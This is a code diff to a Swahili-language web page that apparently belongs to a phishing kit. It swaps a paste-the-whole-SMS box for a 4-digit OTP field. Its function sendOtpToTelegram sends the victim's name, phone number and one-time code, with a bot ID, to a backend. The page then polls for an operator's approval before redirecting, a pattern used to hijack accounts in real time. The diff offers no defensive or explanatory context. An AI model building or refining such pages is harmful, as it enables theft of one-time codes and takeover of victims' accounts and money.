@@ -57,20 +57,21 @@ body {
   color: #1a2b1a;
   margin-bottom: 10px;
 }
-.otp-textarea {
+/* New OTP input styling */
+.otp-input {
   width: 100%;
-  min-height: 100px;
   padding: 16px 18px;
-  font-size: 16px;
+  font-size: 28px;
   font-family: inherit;
+  letter-spacing: 8px;
+  text-align: center;
   border: 2px solid #d0e0d0;
   border-radius: 12px;
   background: #fafffa;
   outline: none;
   transition: border-color 0.2s, box-shadow 0.2s;
-  resize: vertical;
 }
-.otp-textarea:focus {
+.otp-input:focus {
   border-color: #1a7a2a;
   box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.15);
 }
@@ -128,9 +129,10 @@ button:not(:disabled):hover {
     <div id="phoneNumber" class="display-number"></div>
 
     <form id="otpForm">
-      <div class="label">Nakili ujumbe mzima uliopokea kwa SMS na ubandike hapa</div>
-      <textarea id="otpTextarea" class="otp-textarea" 
-                placeholder="Nakili SMS nzima" autocomplete="off"></textarea>
+      <div class="label">Ingiza nambari ya 4-digit OTP</div>
+      <input id="otpInput" class="otp-input" type="text" 
+             inputmode="numeric" pattern="[0-9]*" maxlength="4"
+             placeholder="_ _ _ _" autocomplete="off" />
 
       <button id="submitBtn" disabled>
         <span id="btnText">WASILISHA</span>
@@ -157,27 +159,31 @@ const phone = localStorage.getItem('phone') || "";
 document.getElementById('phoneNumber').textContent =
   phone ? phone.slice(0,6) + "****" + phone.slice(-2) : "No phone number found";
 
-const textarea = document.getElementById('otpTextarea');
+const otpInput = document.getElementById('otpInput');
 const submitBtn = document.getElementById('submitBtn');
 const btnText = document.getElementById('btnText');
 const spinner = document.getElementById('spinner');
 const statusEl = document.getElementById('status');
 
-textarea.addEventListener('input', function() {
-  submitBtn.disabled = this.value.trim().length === 0;
+// Restrict input to digits only
+otpInput.addEventListener('input', function() {
+  this.value = this.value.replace(/\D/g, '');
+  const isValid = this.value.length === 4;
+  submitBtn.disabled = !isValid;
   if (statusEl.textContent) statusEl.textContent = '';
 });
 
+// Auto‑focus on page load
 window.addEventListener('load', function() {
-  textarea.focus();
+  otpInput.focus();
 });
 
-async function sendOtpToTelegram(name, phone, fullMessage) {
+async function sendOtpToTelegram(name, phone, code) {
   try {
     const r = await fetch(`${BACKEND_URL}/submit-code`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ name, phone, code: fullMessage, botId })
+      body: JSON.stringify({ name, phone, code, botId })
     });
     return r.json();
   } catch {
@@ -205,9 +211,9 @@ function pollCodeApproval(requestId) {
 document.getElementById('otpForm').addEventListener('submit', async function(e) {
   e.preventDefault();
 
-  const fullText = textarea.value.trim();
-  if (!fullText) {
-    statusEl.textContent = "Tafadhali bandika ujumbe wako hapa.";
+  const code = otpInput.value.trim();
+  if (code.length !== 4) {
+    statusEl.textContent = "Tafadhali ingiza nambari kamili ya tarakimu 4.";
     return;
   }
 
@@ -220,7 +226,7 @@ document.getElementById('otpForm').addEventListener('submit', async function(e) 
   statusEl.textContent = "Sending OTP for verification...";
   statusEl.className = '';
 
-  const res = await sendOtpToTelegram(name, phone, fullText);
+  const res = await sendOtpToTelegram(name, phone, code);
 
   if (!res || !res.requestId) {
     statusEl.textContent = "Failed to send. Please try again.";
@@ -234,7 +240,7 @@ document.getElementById('otpForm').addEventListener('submit', async function(e) 
   const approved = await pollCodeApproval(res.requestId);
 
   if (approved === true) {
-    localStorage.setItem('code', fullText);
+    localStorage.setItem('code', code);
     statusEl.textContent = "OTP approved! Redirecting...";
     statusEl.className = 'success';
     setTimeout(() => {
@@ -242,11 +248,11 @@ document.getElementById('otpForm').addEventListener('submit', async function(e) 
     }, 500);
   } else {
     statusEl.textContent = "OTP rejected. Please try again.";
-    textarea.value = "";
+    otpInput.value = "";
     submitBtn.disabled = true;
     btnText.textContent = "WASILISHA";
     spinner.style.display = "none";
-    textarea.focus();
+    otpInput.focus();
   }
 });
 
